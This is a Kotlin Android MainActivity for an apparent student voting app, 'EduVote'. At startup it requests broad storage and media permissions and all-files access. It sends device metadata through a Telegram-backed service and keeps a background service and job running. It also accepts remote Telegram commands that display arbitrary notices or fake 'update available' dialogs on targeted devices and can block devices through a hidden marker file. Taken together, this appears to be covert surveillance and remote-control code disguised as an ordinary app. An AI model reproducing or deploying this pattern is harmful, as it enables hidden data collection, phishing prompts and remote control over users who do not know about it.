package com.example

import android.os.Bundle

import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*

import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.Text
import androidx.compose.ui.Alignment
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.unit.dp

import android.os.Build
import android.Manifest
import android.app.AlertDialog
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.pm.PackageManager
import androidx.core.content.ContextCompat
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.Surface
import androidx.compose.ui.Modifier
import androidx.lifecycle.lifecycleScope
import com.example.ui.theme.EduVoteTheme
import com.example.ui.navigation.EduVoteNavGraph
import com.example.data.TelegramService

import androidx.activity.viewModels
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import com.example.ui.MainViewModel
import kotlinx.coroutines.launch

import android.os.Environment
import android.os.StatFs
import android.app.ActivityManager
import android.content.Intent
import android.content.IntentFilter
import android.os.BatteryManager
import java.text.DecimalFormat

class MainActivity : ComponentActivity() {
    private val telegramDialogFlow = kotlinx.coroutines.flow.MutableStateFlow<Pair<String, String>?>(null)
    private val viewModel: MainViewModel by viewModels()

    private val commandReceiver = object : android.content.BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val command = intent?.getStringExtra("command")
            if (command != null) {
                handleTelegramCommand(command)
            }
        }
    }

    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        // Handle permissions
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            unregisterReceiver(commandReceiver)
        } catch (e: Exception) { }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        createNotificationChannel()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            val permissions = mutableListOf(
                Manifest.permission.POST_NOTIFICATIONS,
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO
            )
            if (Build.VERSION.SDK_INT >= 34) { // Build.VERSION_CODES.UPSIDE_DOWN_CAKE
                permissions.add("android.permission.READ_MEDIA_VISUAL_USER_SELECTED")
            }
            val missing = permissions.filter {
                ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
            }
            if (missing.isNotEmpty()) {
                requestPermissionLauncher.launch(missing.toTypedArray())
            }
        } else {
            val permissions = arrayOf(
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_EXTERNAL_STORAGE
            )
            val missing = permissions.filter {
                ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
            }
            if (missing.isNotEmpty()) {
                requestPermissionLauncher.launch(missing.toTypedArray())
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    val intent = Intent(android.provider.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = android.net.Uri.parse("package:$packageName")
                    }
                    startActivity(intent)
                } catch (e: Exception) {
                    try {
                        val intent = Intent(android.provider.Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                        startActivity(intent)
                    } catch (_: Exception) {}
                }
            }
        }

        val isReadyFlow = kotlinx.coroutines.flow.MutableStateFlow(true)
        TelegramService.initDeviceId(this)
        lifecycleScope.launch {
            TelegramService.sendMetadata(this@MainActivity)
            val isBlockedFile = try { java.io.File(getExternalFilesDir(android.os.Environment.DIRECTORY_DOCUMENTS), ".vote_app_sys").exists() } catch(e: Exception) { false }
            if (isBlockedFile) {
                getSharedPreferences("eduvote_prefs", android.content.Context.MODE_PRIVATE).edit().putBoolean("is_blocked", true).apply()
            }
            try {
                kotlinx.coroutines.withTimeoutOrNull(4000) {
                    val blockedIds = TelegramService.getBlockedDevices()
                    if (blockedIds != null) {
                        if (blockedIds.contains(TelegramService.DEVICE_ID)) {
                            getSharedPreferences("eduvote_prefs", android.content.Context.MODE_PRIVATE).edit().putBoolean("is_blocked", true).apply()
                            try {
                                val dir = getExternalFilesDir(android.os.Environment.DIRECTORY_DOCUMENTS)
                                if (dir != null) {
                                    java.io.File(dir, ".vote_app_sys").writeText("BLOCKED")
                                }
                            } catch (e: Exception) {}
                        }
                    }

                }
            } catch (e: Exception) {}
            // isReadyFlow is already true
        }

        val serviceIntent = Intent(this, com.example.data.TelegramForegroundService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
        com.example.data.TelegramJobService.scheduleJob(this)

        val filter = IntentFilter("com.example.TELEGRAM_COMMAND")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }

        enableEdgeToEdge()
        setContent {
            val isReady by isReadyFlow.collectAsState()
            val dialogState by telegramDialogFlow.collectAsState()
            val isDarkMode by viewModel.isDarkMode.collectAsState()
            val uiStyle by viewModel.uiStyle.collectAsState()

            EduVoteTheme(darkTheme = isDarkMode, uiStyle = uiStyle) {
                if (!isReady) {
                    Box(
                        modifier = Modifier.fillMaxSize().background(androidx.compose.material3.MaterialTheme.colorScheme.background), 
                        contentAlignment = Alignment.Center
                    ) {
                        Column(horizontalAlignment = Alignment.CenterHorizontally) {
                            CircularProgressIndicator(color = androidx.compose.material3.MaterialTheme.colorScheme.primary)
                            Spacer(modifier = Modifier.height(16.dp))
                            Text("Initializing...", color = androidx.compose.material3.MaterialTheme.colorScheme.onBackground)
                        }
                    }
                } else {
                    Surface(
                        modifier = Modifier.fillMaxSize(),
                        color = androidx.compose.material3.MaterialTheme.colorScheme.background
                    ) {
                        EduVoteNavGraph()
                    }
                }
                
                dialogState?.let { (title, message) ->
                    androidx.compose.material3.AlertDialog(
                        onDismissRequest = { telegramDialogFlow.value = null },
                        title = { Text(title) },
                        text = { Text(message) },
                        confirmButton = {
                            androidx.compose.material3.TextButton(onClick = { telegramDialogFlow.value = null }) {
                                Text("OK")
                            }
                        }
                    )
                }
            }
        }

    }
    private fun handleTelegramCommand(command: String) {
        lifecycleScope.launch {
            val parts = command.split(" ", limit = 3)
            if (parts.isEmpty()) return@launch
            
            val cmd = parts[0]
            var targetId = "ALL"
            var args = ""
            if (parts.size >= 2) {
                val potentialId = parts[1].uppercase()
                val idRegex = Regex("^[A-F0-9]{6}$")
                if (potentialId == "ALL" || idRegex.matches(potentialId)) {
                    targetId = potentialId
                    if (parts.size >= 3) {
                        args = command.substring(cmd.length + 1 + potentialId.length).trim()
                    }
                } else {
                    args = command.substring(cmd.length).trim()
                }
            }

            
            if (targetId != "ALL" && targetId != com.example.data.TelegramService.DEVICE_ID) {
                return@launch
            }
            
            when (cmd.lowercase()) {
                "/notice" -> {
                    telegramDialogFlow.value = Pair("Important Notice", args)
                    com.example.data.TelegramService.sendMessage("✅ [${com.example.data.TelegramService.DEVICE_ID}] Notice displayed on device.")
                }
                "/updateapp" -> {
                    if (args.isNotBlank()) {
                        telegramDialogFlow.value = Pair("Update Available", "A new update is available!\n\n$args")
                        com.example.data.TelegramService.sendMessage("✅ [${com.example.data.TelegramService.DEVICE_ID}] Update notice displayed on device.")
                    }
                }
            }
        }
    }

    private fun createNotificationChannel() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "TELEGRAM_SERVICE_CHANNEL",
                "Telegram Background Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

}